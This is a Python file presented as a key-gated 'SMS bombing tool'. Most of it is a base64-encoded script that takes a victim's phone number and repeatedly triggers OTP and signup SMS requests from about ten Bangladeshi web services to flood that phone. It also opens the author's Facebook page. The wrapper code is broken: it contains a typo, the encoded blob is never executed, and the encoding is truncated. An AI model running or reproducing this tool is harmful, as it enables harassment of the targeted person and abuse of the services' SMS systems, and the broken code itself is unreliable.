import sys, hashlib, getpass

def get_hashed_text(text:str):
    return hashlib.sha256(text.encode()).hexdigest()

while 1:
   key = getpass.getpass('[+] Enter key: ')
   if get_hashed_text(key) != '477a4494a9b8bd2e6ad0eeeb6ecd6aa7d16a5b5f161c954d76b96a7eb311325c':
      sys.stderr,write(f'your given key "{key}" is incorrect.\n')
   
   else:
       break
	   
# Our main function 
print('Hello there!')
print('Welcome to this SMS BOMBEING TOOL👹👹,')
print('You are seeing this because you passed the key verification')

Iy0tLS0tLS0tLXsgQURNSU4gSU5GTyB9LS0tLS0tLS0tLQojIEFVVEhPUiAgIDpSQUZJTiBLSEFOCiMgVEVBTSAgIEFVVEhPUiA6IFJBRklOCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAKCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc210cGxpYgoKb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDgwMzY0MzU0ODYzJm1pYmV4dGlkPVpiV0t3TCIpIApvcy5zeXN0ZW0oImNsZWFyIikKZGVmIHNsdyhsKToKICBmb3IgaSBpbiBsOgogICAgc3lzLnN0ZG91dC53cml0ZShpKQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICB0aW1lLnNsZWVwKDAuMSkKCgpkZWYgcHJpbWlhbSgpOgogIG9zLnN5c3RlbSgiY2xlYXIiKQogIGxvZ289IiIiXDAzM1szODs1OzQ2bQogIAoKCiQkJCQkJCRcICAgJCQkJCQkXCAgJCQkJCQkJCRcICQkJCQkJFwgJCRcICAgJCRcIAokJCAgX18kJFwgJCQgIF9fJCRcICQkICBfX19fX3xcXyQkICBffCQkJFwgICQkIHwKJCQgfCAgJCQgfCQkIC8gICQkIHwkJCB8ICAgICAgICAkJCB8ICAkJCQkXCAkJCB8CiQkJCQkJCQgIHwkJCQkJCQkJCB8JCQkJCRcICAgICAgJCQgfCAgJCQgJCRcJCQgfAokJCAgX18kJDwgJCQgIF9fJCQgfCQkICBfX3wgICAgICQkIHwgICQkIFwkJCQkIHwKJCQgfCAgJCQgfCQkIHwgICQkIHwkJCB8ICAgICAgICAkJCB8ICAkJCB8XCQkJCB8CiQkIHwgICQkIHwkJCB8ICAkJCB8JCQgfCAgICAgICQkJCQkJFwgJCQgfCBcJCQgfApcX198ICBcX198XF9ffCAgXF9ffFxfX3wgICAgICBcX19fX19ffFxfX3wgIFxfX3wKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKQ3JlYXRvciA6UkFGSU4gS0hBTgpHSVRIVUIgICAgOiBSYWZpbjc2NTUKVkVSU0lPTiAgIDogMi4wClBST0pFQ1QgICA6IFNNUyBCT01CRVIgCkZBQ0VCT09LICA6IFJBRklOIEtIQU4Kw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5ciIiIKICBmb3IgaSBpbiBsb2dvOgogICAgc3lzLnN0ZG91dC53cml0ZShpKQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICB0aW1lLnNsZWVwKDAuMDAxKQogIG51bT1pbnB1dCgiXG5cblwwMzNbMzg7NTsxOTVtW1wwMzNbMzg7NTs0Nm0rXDAzM1szODs1OzE5NW1dIFZJQ1RJTVMgTlVNQkVSIDogODgwIikKICBsaW1pdD1pbnQoaW5wdXQoIlxuXDAzM1szODs1OzE5NW1bXDAzM1szODs1OzQ2bStcMDMzWzM4OzU7MTk1bV0gTUVTU0FHRSBMSU1JVCA6ICIpKQogIAogIGhlYWRlcnMgPSB7CiAgICAgICdhdXRob3JpdHknOiAnd3d3LmJpb3Njb3BlbGl2ZS5jb20nLAogICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgnLAogICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5iaW9zY29wZWxpdmUuY29tL2VuL2xvZ2luJywKICAgICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEwNyIsICJOb3Q9QT9CcmFuZCI7dj0iMjQiJywKICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLAogICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsCiAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsCiAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywKICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywKICAgICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNMjAxMEoxOUNJKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLAogIH0KICAKICB1cmwxPWYiaHR0cHM6Ly93d3cuYmlvc2NvcGVsaXZlLmNvbS9lbi9sb2dpbi9zZW5kLW90cD9waG9uZT04ODB7bnVtfSZvcGVyYXRvcj1iZC1vdHAiCiAgCiAgaGVhZGVyczIgPSB7CiAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vcmVkeC5jb20uYmQvJywKICAgICAgJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE0yMDEwSjE5Q0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDcuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogIH0KICAKICBkYXRhMSA9IHsKICAgICAgJ25hbWUnOiBudW0sCiAgICAgICdwaG9uZU51bWJlcic6IG51bSwKICAgICAgJ3NlcnZpY2UnOiAncmVkeCcsCiAgfQogIAogIHVybDI9Imh0dHBzOi8vYXBpLnJlZHguY29tLmJkL3YxL3VzZXIvc2lnbnVwIgogIAogIGhlYWRlcnMzID0gewogICAgICAnYXV0aG9yaXR5JzogJ2Jpa3JveS5jb20nLAogICAgICAnYWNjZXB0JzogJ2FwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKicsCiAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnYm4nLAogICAgICAnYXBwbGljYXRpb24tbmFtZSc6ICd3ZWInLAogICAgICAncmVmZXJlcic6ICdodHRwczovL2Jpa3JveS5jb20vYm4vdXNlcnMvbG9naW4nLAogICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkFuZHJvaWQiJywKICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5JywKICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLAogICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE0yMDEwSjE5Q0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDcuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogIH0KICAKICB1cmwzPSAiaHR0cHM6Ly9iaWtyb3kuY29tL2RhdGEvcGhvbmVfbnVtYmVyX2xvZ2luL3ZlcmlmaWNhdGlvbnMvcGhvbmVfbG9naW4/cGhvbmU9MCIrbnVtCiAgCiAgaGVhZGVyczQgPSB7CiAgICAgICdhdXRob3JpdHknOiAnd3d3LmllYXRlcnkuY29tLmJkJywKICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjknLAogICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44JywKICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly93d3cuaWVhdGVyeS5jb20uYmQvbG9naW4nLAogICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkFuZHJvaWQiJywKICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywKICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ25hdmlnYXRlJywKICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywKICAgICAgJ3NlYy1mZXRjaC11c2VyJzogJz8xJywKICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsCiAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTTIwMTBKMTlDSSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgfQogIAogIHVybDQ9Imh0dHBzOi8vd3d3LmllYXRlcnkuY29tLmJkL290cC12ZXJpZnk/cGhuPTAiK251bQogIAogIGhlYWRlcnM1ID0gewogICAgICAncmVmZXJlcic6ICdodHRwczovL2RvY3RpbWUuY29tLmJkLycsCiAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTTIwMTBKMTlDSSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgfQogIGRhdGEyID0gewogICAgICAnZmxhZyc6ICdodHRwczovL2RvY3RpbWUtY29yZS1hcC1zb3V0aGVhc3QtMS5zMy5hcC1zb3V0aGVhc3QtMS5hbWF6b25hd3MuY29tL2ltYWdlcy9jb3VudHJ5LWZsYWdzL2ZsYWctODAwLnBuZycsCiAgICAgICdjb2RlJzogJzg4JywKICAgICAgJ2NvbnRhY3Rfbm8nOiAnMCcrbnVtLAogICAgICAnY291bnRyeV9jYWxsaW5nX2NvZGUnOiAnODgnLAogIH0KICAKICBoZWFkZXJzNiA9IHsKICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly9vc3VkcG90cm8uY29tLycsCiAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTTIwMTBKMTlDSSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgfQogIAogIGRhdGEzID0gewogICAgICAnbW9iaWxlJzogJys4OC0wJytudW0sCiAgICAgICdkZXZpY2VUb2tlbic6ICd3ZWInLAogICAgICAnbGFuZ3VhZ2UnOiAnZW4nLAogICAgICAnb3MnOiAnd2ViJywKICB9CiAgaGVhZGVyczcgPSB7CiAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vb3N1ZHBvdHJvLmNvbS8nLAogICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE0yMDEwSjE5Q0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDcuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogIH0KICAKICBkYXRhNCA9IHsKICAgICAgJ21vYmlsZSc6ICcrODgtMCcrbnVtLAogICAgICAnZGV2aWNlVG9rZW4nOiAnd2ViJywKICAgICAgJ2xhbmd1YWdlJzogJ2VuJywKICAgICAgJ29zJzogJ3dlYicsCiAgfQogIGhlYWRlcnM4ID0gewogICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44JywKICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICdPcmlnaW4nOiAnaHR0cHM6Ly9odW5ncnluYWtpLmNvbScsCiAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vaHVuZ3J5bmFraS5jb20vJywKICAgICAgJ1NlYy1GZXRjaC1EZXN0JzogJ2VtcHR5JywKICAgICAgJ1NlYy1GZXRjaC1Nb2RlJzogJ2NvcnMnLAogICAgICAnU2VjLUZldGNoLVNpdGUnOiAnc2FtZS1zaXRlJywKICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNMjAxMEoxOUNJKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgJ2FjY2VwdCc6ICcqLyonLAogICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkFuZHJvaWQiJywKICB9CiAgCiAgZGF0YTggPSB7CiAgICAgICdvcGVyYXRpb25OYW1lJzogJ2NyZWF0ZU90cCcsCiAgICAgICd2YXJpYWJsZXMnOiB7CiAgICAgICAgICAncGhvbmUnOiIiK251bSwKICAgICAgICAgICdjb3VudHJ5JzogJzg4MCcsCiAgICAgICAgICAndXVpZCc6ICc2ZmRiNTk1Yi1hMzEwLTRmODItYWNjYS1hOWI5YzQzZTRlYjAnLAogICAgICAgICAgJ29zVmVyc2lvbkNvZGUnOiAnTGludXggYWFyY2g2NCcsCiAgICAgICAgICAnZGV2aWNlQnJhbmQnOiAnQ2hyb21lJywKICAgICAgICAgICdkZXZpY2VNb2RlbCc6ICcxMDcnLAogICAgICAgICAgJ3JlcXVlc3RGcm9tJzogJ1UyRnNkR1ZrWDE5dTJua1o1S01rR3RweWUvQTNrcFpmV0t2M3lsS0V4Yk09JywKICAgICAgfSwKICAgICAgJ3F1ZXJ5JzogJ211dGF0aW9uIGNyZWF0ZU90cCgkcGhvbmU6IFBob25lTnVtYmVyISwgJGNvdW50cnk6IFN0cmluZyEsICR1dWlkOiBTdHJpbmchLCAkb3NWZXJzaW9uQ29kZTogU3RyaW5nLCAkZGV2aWNlQnJhbmQ6IFN0cmluZywgJGRldmljZU1vZGVsOiBTdHJpbmcsICRyZXF1ZXN0RnJvbTogU3RyaW5nKSB7XG4gIGNyZWF0ZU90cChhdXRoOiB7cGhvbmU6ICRwaG9uZSwgY291bnRyeUNvZGU6ICRjb3VudHJ5LCBkZXZpY2VVdWlkOiAkdXVpZCwgZGV2aWNlVG9rZW46ICIifSwgZGV2aWNlOiB7ZGV2aWNlVHlwZTogV0VCLCBvc1ZlcnNpb25Db2RlOiAkb3NWZXJzaW9uQ29kZSwgZGV2aWNlQnJhbmQ6ICRkZXZpY2VCcmFuZCwgZGV2aWNlTW9kZWw6ICRkZXZpY2VNb2RlbH0sIHJlcXVlc3RGcm9tOiAkcmVxdWVzdEZyb20pIHtcbiAgICBzdGF0dXNDb2RlXG4gIH1cbn1cbicsCiAgfQogIGNvb2tpZXM5ID0gewogICAgICAnX2dhJzogJ0dBMS4zLjE2NzExODgzMTkuMTY3NzY0MjY0MScsCiAgICAgICdfZ2lkJzogJ0dBMS4zLjQwNzEzNDUxOS4xNjc3NjQyNjQxJywKICAgICAgJ19nYXRfVUEtMTQ2Nzk2MTc2LTInOiAnMScsCiAgICAgICdfZmJwJzogJ2ZiLjIuMTY3NzY0MjY0MTkwMy4yMDA1MTYyNDcxJywKICAgICAgJ19nYV81TEY0MzU5RkQzJzogJ0dTMS4xLjE2Nzc2NDI2NDAuMS4xLjE2Nzc2NDI2NjAuMC4wLjAnLAogIH0KICAKICBoZWFkZXJzOSA9IHsKICAgICAgJ2F1dGhvcml0eSc6ICdmdW5kZXNoLmNvbS5iZCcsCiAgICAgICdhY2NlcHQnOiAnYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qJywKICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCcsCiAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD1VVEYtOCcsCiAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly9mdW5kZXNoLmNvbS5iZCcsCiAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vZnVuZGVzaC5jb20uYmQvZnVuZGVzaC9wcm9maWxlJywKICAgICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEwNyIsICJOb3Q9QT9CcmFuZCI7dj0iMjQiJywKICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLAogICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsCiAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsCiAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywKICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywKICAgICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNMjAxMEoxOUNJKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICB9CiAgCiAgcGFyYW1zOSA9IHsKICAgICAgJ3NlcnZpY2Vfa2V5JzogJycsCiAgfQogIAogIGpzb25fZGF0YTkgPSB7CiAgICAgICdtc2lzZG4nOiAnJytudW0sCiAgfQogIGhlYWRlcnMxMCA9IHsKICAgICAgJ0FjY2VwdCc6ICcqLyonLAogICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44JywKICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICdPcmlnaW4nOiAnaHR0cHM6Ly9lY291cmllci5jb20uYmQnLAogICAgICAnUmVmZXJlcic6ICdodHRwczovL2Vjb3VyaWVyLmNvbS5iZC8nLAogICAgICAnU2VjLUZldGNoLURlc3QnOiAnZW1wdHknLAogICAgICAnU2VjLUZldGNoLU1vZGUnOiAnY29ycycsCiAgICAgICdTZWMtRmV0Y2gtU2l0ZSc6ICdzYW1lLXNpdGUnLAogICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE0yMDEwSjE5Q0kpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDcuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkFuZHJvaWQiJywKICB9CiAgdXJsMTA9Imh0dHBzOi8vYmFja29mZmljZS5lY291cmllci5jb20uYmQvYXBpL3dlYi9pbmRpdmlkdWFsLXNlbmQtb3RwP21vYmlsZT0wIitudW0KIyAgCiAgc2VzPTAKICB3aGlsZSBsaW1pdD5zZXM6CiAgICBzZW50MT1yZXF1ZXN0cy5nZXQodXJsMSwgaGVhZGVycz1oZWFkZXJzKQogICAgaWYgc2VudDEuc3RhdHVzX2NvZGU9PTIwMDoKICAgICAgc2VzKz0xCiAgICAgIHByaW50KGYiXDAzM1szODs1OzE5NW1cbltcMDMzWzM4OzU7NDZte3Nlc31cMDMzWzM4OzU7MTk1bV1cMDMzWzM4OzU7NDZtIFNNUyBXQVMgU0VOVCDwn5i2IikKICAgIGVsc2U6CiAgICAgIHBhc3MKICAgIHNlbnQyPXJlcXVlc3RzLnBvc3QodXJsMiwgaGVhZGVycz1oZWFkZXJzMixkYXRhPWRhdGExKQogICAgaWYgc2VudDIuc3RhdHVzX2NvZGU9PTIwMDoKICAgICAgc2VzKz0xCiAgICAgIHByaW50KGYiXDAzM1szODs1OzE5NW1cbltcMDMzWzM4OzU7NDZte3Nlc31cMDMzWzM4OzU7MTk1bV1cMDMzWzM4OzU7NDZtIFNNUyBXQVMgU0VOVCDwn6SjIikKICAgIGVsc2U6CiAgICAgIHBhc3MKICAgIHNlbnQzPXJlcXVlc3RzLmdldCh1cmwzLGhlYWRlcnM9aGVhZGVyczMpCiAgICBpZiBzZW50My5zdGF0dXNfY29kZT09MjAwOgogICAgICBzZXMrPTEKICAgICAgcHJpbnQoZiJcMDMzWzM4OzU7MTk1bVxuW1wwMzNbMzg7NTs0Nm17c2VzfVwwMzNbMzg7NTsxOTVtXVwwMzNbMzg7NTs0Nm0gU01TIFdBUyBTRU5UIPCfmJIiKQogICAgZWxzZToKICAgICAgcGFzcwogICAgc2VudDQ9cmVxdWVzdHMuZ2V0KHVybDQsaGVhZGVycz1oZWFkZXJzNCkKICAgIGlmIHNlbnQ0LnN0YXR1c19jb2RlPT0yMDA6CiAgICAgIHNlcys9MQogICAgICBwcmludChmIlwwMzNbMzg7NTsxOTVtXG5bXDAzM1szODs1OzQ2bXtzZXN9XDAzM1szODs1OzE5NW1dXDAzM1szODs1OzQ2bSBTTVMgV0FTIFNFTlQg8J+kqiIpCiAgICBlbHNlOgogICAgICBwYXNzCiAgICBzZW50NT1yZXF1ZXN0cy5wb3N0KCdodHRwczovL2FkbWluLmRvY3RpbWUuY29tLmJkL2FwaS9hdXRoZW50aWNhdGUnLCBoZWFkZXJzPWhlYWRlcnM1LCBkYXRhPWRhdGEyKQogICAgaWYgc2VudDUuc3RhdHVzX2NvZGU9PTIwMDoKICAgICAgc2VzKz0xCiAgICAgIHByaW50KGYiXDAzM1szODs1OzE5NW1cbltcMDMzWzM4OzU7NDZte3Nlc31cMDMzWzM4OzU7MTk1bV1cMDMzWzM4OzU7NDZtIFNNUyBXQVMgU0VOVCDwn6SpIikKICAgIGVsc2U6CiAgICAgIHBhc3MKICAgIHNlbnQ2PXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLm9zdWRwb3Ryby5jb20vYXBpL3YxL3VzZXJzL3NlbmRfb3RwJywgaGVhZGVycz1oZWFkZXJzNiwgZGF0YT1kYXRhMykKICAgIGlmIHNlbnQ2LnN0YXR1c19jb2RlPT0yMDA6CiAgICAgIHNlcys9MQogICAgICBwcmludChmIlwwMzNbMzg7NTsxOTVtXG5bXDAzM1szODs1OzQ2bXtzZXN9XDAzM1szODs1OzE5NW1dXDAzM1szODs1OzQ2bSBTTVMgV0FTIFNFTlQg8J+kqSIpCiAgICBlbHNlOgogICAgICBwYXNzCiAgICBzZW50Nz1yZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwaS5vc3VkcG90cm8uY29tL2FwaS92MS91c2Vycy9zZW5kX290cCcsIGhlYWRlcnM9aGVhZGVyczcsIGRhdGE9ZGF0YTQpCiAgICBpZiBzZW50Ny5zdGF0dXNfY29kZT09MjAwOgogICAgICBzZXMrPTEKICAgICAgcHJpbnQoZiJcMDMzWzM4OzU7MTk1bVxuW1wwMzNbMzg7NTs0Nm17c2VzfVwwMzNbMzg7NTsxOTVtXVwwMzNbMzg7NTs0Nm0gU01TIFdBUyBTRU5UIPCfmI0iKQogICAgZWxzZToKICAgICAgcGFzcwogICAgc2VudDg9cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGktdjQtMS5odW5ncnluYWtpLmNvbS9ncmFwaHFsJywgaGVhZGVycz1oZWFkZXJzOCwganNvbj1kYXRhOCkKICAgIGlmIHNlbnQ4LnN0YXR1c19jb2RlPT0yMDA6CiAgICAgIHNlcys9MQogICAgICBwcmludChmIlwwMzNbMzg7NTsxOTVtXG5bXDAzM1szODs1OzQ2bXtzZXN9XDAzM1szODs1OzE5NW1dXDAzM1szODs1OzQ2bSBTTVMgV0FTIFNFTlQg8J+YiiIpCiAgICBlbHNlOgogICAgICBwYXNzCiAgICBzZW50OT1yZXF1ZXN0cy5wb3N0KAogICAgICAgICdodHRwczovL2Z1bmRlc2guY29tLmJkL2FwaS9hdXRoL2dlbmVyYXRlT1RQJywKICAgICAgICBwYXJhbXM9cGFyYW1zOSwKICAgICAgICBjb29raWVzPWNvb2tpZXM5LAogICAgICAgIGhlYWRlcnM9aGVhZGVyczksCiAgICAgICAganNvbj1qc29uX2RhdGE5LAogICAgKQogICAgaWYgc2VudDkuc3RhdHVzX2NvZGU9PTIwMDoKICAgICAgc2VzKz0xCiAgICAgIHByaW50KGYiXDAzM1szODs1OzE5NW1cbltcMDMzWzM4OzU7NDZte3Nlc31cMDMzWzM4OzU7MTk1bV1cMDMzWzM4OzU7NDZtIFNNUyBXQVMgU0VOVCDwn5iBIikKICAgIGVsc2U6CiAgICAgIHBhc3MKICAgIHNlbnQxMCA9IHJlcXVlc3RzLmdldCh1cmwxMCxoZWFkZXJzPWhlYWRlcnMxMCkKICAgIGlmIHNlbnQxMC5zdGF0dXNfY29kZT09MjAwOgogICAgICBzZXMrPTEKICAgICAgcHJpbnQoZiJcMDMzWzM4OzU7MTk1bVxuW1wwMzNbMzg7NTs0Nm17c2VzfVwwMzNbMzg7NTsxOTVtXVwwMzNbMzg7NTs0Nm0gU01TIFdBUyBTRU5UIPCfmJgiKQogIG9zLnN5c3RlbSgiY2xlYXIiKQogIHByaW50KCIiIiBcMDMzWzM4OzU7NDZtCgogIF9fX19fICAgICAgICAgICAgX19fX19fIF9fX19fIF8gICBfIAogfCAgX18gXCAgICAgL1wgICB8ICBfX19ffF8gICBffCBcIHwgfAogfCB8X18pIHwgICAvICBcICB8IHxfXyAgICB8IHwgfCAgXHwgfAogfCAgXyAgLyAgIC8gL1wgXCB8ICBfX3wgICB8IHwgfCAuIGAgfAogfCB8IFwgXCAgLyBfX19fIFx8IHwgICAgIF98IHxffCB8XCAgfAogfF98ICBcX1wvXy8gICAgXF9cX3wgICAgfF9fX19ffF98IFxffAoKIFROUSBGT1IgVVNJTkcgT1VSIFRPT0xTIPCflqTwn6WwCiIiIikgICAgCiAgb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDgwMzY0MzU0ODYzJm1pYmV4dGlkPVpiV0t3TCIpCiAgc3lzLmV4aXQoKQpiYW5lcj0gb3Muc3lzdGVtKCJmaWdsZXQgLWYgc2xhbnQgUkFGSU4iKQpiYW5lciA9IHN0cihiYW5lcikKYmFuZXIgPSBiYW5lci5yZXBsYWNlKCIwIiwiIikKbG9nbz1mIiIiIHtiYW5lcn0gXDAzM1sxOzM3bQrDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXClwwMzNbMTszN23inbJcMDMzWzM4OzU7NDZtK1wwMzNbMTszN23inbMgREVWRUxPUEVSIDpSQUZJTiBLSEFOClwwMzNbMTszN23inbJcMDMzWzM4OzU7NDZtK1wwMzNbMTszN23inbMgR0lUSFVCICAgIDpSYWZpbjc2NTUKXDAzM1sxOzM3beKdslwwMzNbMzg7NTs0Nm0rXDAzM1sxOzM3beKdsyBWRVJTSU9OICAgOiAyLjAKXDAzM1sxOzM3beKdslwwMzNbMzg7NTs0Nm0rXDAzM1sxOzM3beKdsyBQUk9KRUNUICAgOiBTTVMgQk9NQklORyAKXDAzM1sxOzM3beKdslwwMzNbMzg7NTs0Nm0rXDAzM1sxOzM3beKdsyBGQUNFQk9PSyAgOiBSQUZJTiBLSEFOCsOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl